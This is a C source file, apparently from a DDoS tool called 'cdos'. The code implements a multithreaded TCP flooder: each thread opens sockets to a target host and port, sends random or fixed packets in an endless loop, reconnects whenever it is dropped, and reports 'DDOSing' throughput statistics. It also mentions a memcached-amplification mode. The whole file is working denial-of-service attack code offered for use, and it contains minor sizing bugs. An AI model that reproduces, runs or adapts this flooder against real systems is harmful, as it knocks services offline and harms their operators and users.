//
//  ddos.c
//  cdos
//
//  Created by Andre Zay on 17.12.2017.
//  Copyright © 2017 Andre Zay. All rights reserved.
//

#include "ddos.h"
#include "util.h"

#include <math.h>//pow
#include <stdio.h>//close

#ifndef DOUBLE_MAX
#define DOUBLE_MAX 0.0
#endif



double psent;
char* __host;
int __port;
int tcount = 0;
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
bool status;
uint8_t metrics;
double psize;//one packet size in selected metrics
bool __run;//still running?

uint64_t pc;//Now it used for speed counting
bool use_dos_sleep;
int dos_sleep;

int64_t plen;//packet length in bytes
clock_t tm;//last time stat updated
int64_t pc_old;//packets count on last stat update
char *smetrics;//string of metrics type
double psent_old;//old packet sendings(when ddos_stat() was called lsat time)

void __exit()
{
    __run = false;
    pthread_mutex_lock(&mutex);
    fflush(stdout);
    printf("%c[2K", 27);
    printf("\r");
    success("Total data sent:%.2f%s",psent,smetrics);
    info("Quitting...");
    pthread_mutex_unlock(&mutex);
    exit(0);
}

void __perror(){//for debugging
    __run = false;
    pthread_mutex_lock(&mutex);
    printf("%c[2K", 27);
    printf("\r");
    error("Programming error:Abort trap(6):maybe type overflow?");
    pthread_mutex_unlock(&mutex);
    exit(-1);
}
void _ddos_tcp(char* host, int port, char* packet)
{
    tcount++;
    
    bool RAND_PACKET = (packet == NULL);
    if (port == 0) {
        port = randport();
    }
    int sock = dos_tcp_sock(host, port);
    if (sock < 0) {
        pthread_mutex_lock(&mutex);
        fflush(stdout);
        error("Connection failure");
        error("Quitting thread!");
        pthread_mutex_unlock(&mutex);
        return;
    }
    char* buf = (char*)malloc(1024 * sizeof(buf));
    size_t _bufsize = 1024 * sizeof(buf);
    for (;;) {
        if(use_dos_sleep){
            sleep_ms(dos_sleep);
        }
        if (!__run) {
            shutdown(sock, 2);
            close(sock);
            break;
        }
        if(sock<0){
            dperror("Failed to open socket");
        }
        if (RAND_PACKET) {
            packet = randstring(randrange(64, 2048));
        }
        if (dos_tcp_send_noalloc(sock, packet, buf, _bufsize)) {
            int _error = 0;
            socklen_t len = sizeof(error);
            getsockopt(sock, SOL_SOCKET, SO_ERROR, &_error, &len);
            if (_error != 0) {
                pthread_mutex_lock(&mutex);
                shutdown(sock, 2);
                fflush(stdout);
                warning("Socket disconnected.");
                info("Attempting to reconnect tcp sock");
                shutdown(sock, 2);
                close(sock);
                sock = dos_tcp_sock(host, port);
                pthread_mutex_unlock(&mutex);
            }
        }
        if(status){//we are displaying status so we need to count packets
            psent+=psize;
            pc++;
        }
    }
    tcount--;
}

void _ddos_stat()//update stat
{
    success("Status:");
    success("Hit ^C to exit");
    for (;;) {
        clock_t now=clock();
        double delta_t=(double)(now - tm) / CLOCKS_PER_SEC;//time diff
        double delta_p=psent-psent_old;
        if (!__run) {
            break;
        }
        success_n("DDOSing %s:%d;Packets sent:%.2f %s,thread count:%d,%.2f%s/s\r", __host, __port, psent,smetrics, tcount,delta_p/delta_t,smetrics);
        pc=0;
    }
}

_dos_param* _init_dos_p(char* host, int port, char* packet, uint8_t mode)
{
    _dos_param* p = malloc(sizeof(_dos_param) + (strlen(host) + strlen(packet)) * sizeof(char));
    p->host = host;
    p->port = port;
    p->packet = packet;
    p->mode = mode;
    return p;
}



void __ddos_wrapper(_dos_param* x)
{
    if (x->mode == MODE_TCP) {
        _ddos_tcp(x->host, x->port, x->packet);
    }else {
        error("Bad wrapper descriptor!");
        assert(false);
    }
}
void ddos(char* host, int port, char* packet, int _tcount, int mode)
{
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, __exit);
    signal(SIGABRT, __perror);
    
    pc = 0;
    plen=strlen(packet);
    psize=plen/pow(1024.0,metrics);
    __run = true;
    smetrics=metrics2str(metrics);
    __host = host;
    __port = port;
    psent_old=0.0;
    psent=0.0;
    _dos_param* p = _init_dos_p(host, port, packet, mode);
    pthread_t* _ddos = (pthread_t*)malloc(sizeof(pthread_t) * (_tcount + 1));
    // pthread_mutex_init(&mutex, NULL);
    if(status&&mode!=MODE_MEMCRASHED){
        pthread_create(&_ddos[0], NULL, (void*)_ddos_stat, NULL);
        status=1;
    }else{
        success("Hit ^C to exit");
        success("DDOSing target %s",host);
    }
    
    for (int i = status; i < _tcount + 1; i++) {
        if (pthread_create(&_ddos[i], NULL, (void*)__ddos_wrapper, p)) {
            error("Failed to create thread #%d!", i);
            continue;
        }
    }
    
    pthread_join(_ddos[_tcount], NULL);
}
